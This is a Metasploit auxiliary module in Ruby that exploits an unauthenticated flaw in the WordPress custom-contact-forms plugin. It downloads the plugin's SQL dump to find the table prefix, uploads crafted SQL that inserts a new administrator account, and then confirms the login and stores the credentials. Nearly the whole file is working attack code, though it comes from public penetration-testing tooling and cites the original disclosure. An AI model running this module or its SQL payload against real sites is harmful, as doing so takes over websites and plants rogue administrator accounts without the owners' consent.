##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress custom-contact-forms Plugin SQL Upload',
      'Description'    => %q{
          The WordPress custom-contact-forms plugin <= 5.1.0.3 allows unauthenticated users to download
          a SQL dump of the plugins database tables. It's also possible to upload files containing
          SQL statements which will be executed. The module first tries to extract the WordPress
          table prefix from the dump and then attempts to create a new admin user.
      },
      'Author' =>
        [
          'Marc-Alexandre Montpas', # Vulnerability discovery
          'Christian Mehlmauer' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://blog.sucuri.net/2014/08/database-takeover-in-custom-contact-forms.html' ],
          [ 'URL', 'https://plugins.trac.wordpress.org/changeset?old_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.3&old=997569&new_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.4&new=997569&sfp_email=&sfph_mail=' ],
          [ 'WPVDB', '7542' ]
        ],
      'DisclosureDate' => 'Aug 07 2014'
      ))
  end

  def get_sql(table_prefix, username, password)
    # create user
    sql = "INSERT INTO #{table_prefix}users (user_login, user_pass) VALUES ('#{username}','#{Rex::Text.md5(password)}');"
    # make user administrator
    sql << "INSERT INTO #{table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ((select id from #{table_prefix}users where user_login='#{username}'),'#{table_prefix}capabilities','a:1:{s:13:\"administrator\";b:1;}'),((select id from #{table_prefix}users where user_login='#{username}'),'#{table_prefix}user_level','10');"

    sql
  end

  def get_table_prefix
    res = send_request_cgi({
      'uri'       => wordpress_url_admin_post,
      'method'    => 'POST',
      'vars_post' => {
        'ccf_export' => "1"
      }
    })
    return nil if res.nil? || res.code != 302 || res.headers['Location'] !~ /\.sql$/

    file = res.headers['Location']
    res_file = send_request_cgi('uri' => file)
    return nil if res_file.nil? || res_file.code != 200 || res_file.body.nil?

    match = res_file.body.match(/insert into `(.+_)customcontactforms_fields`/i)
    return nil if match.nil? || match.length < 2

    table_prefix = match[1]
    table_prefix
  end

  def run
    username = Rex::Text.rand_text_alpha(10)
    password = Rex::Text.rand_text_alpha(20)

    print_status("Trying to get table_prefix")
    table_prefix = get_table_prefix
    if table_prefix.nil?
      print_error("Unable to get table_prefix")
      return
    else
      print_status("got table_prefix '#{table_prefix}'")
    end

    data = Rex::MIME::Message.new
    data.add_part(get_sql(table_prefix, username, password), 'text/plain', nil, "form-data; name=\"import_file\"; filename=\"#{Rex::Text.rand_text_alpha(5)}.sql\"")
    data.add_part('1', nil, nil, 'form-data; name="ccf_merge_import"')
    post_data = data.to_s

    print_status("Inserting user #{username} with password #{password}")
    res = send_request_cgi(
      'method'   => 'POST',
      'uri'      => wordpress_url_admin_post,
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'data'     => post_data
    )

    if res.nil? || res.code != 302 || res.headers['Location'] != 'options-general.php?page=custom-contact-forms'
      fail_with(Failure::UnexpectedReply, "#{peer} - Upload failed")
    end

    # test login
    cookie = wordpress_login(username, password)

    # login successful
    if cookie
      print_good("User #{username} with password #{password} successfully created")
      store_valid_credential(user: username, private: password, proof: cookie)
    else
      print_error("User creation failed")
      return
    end
  end
end
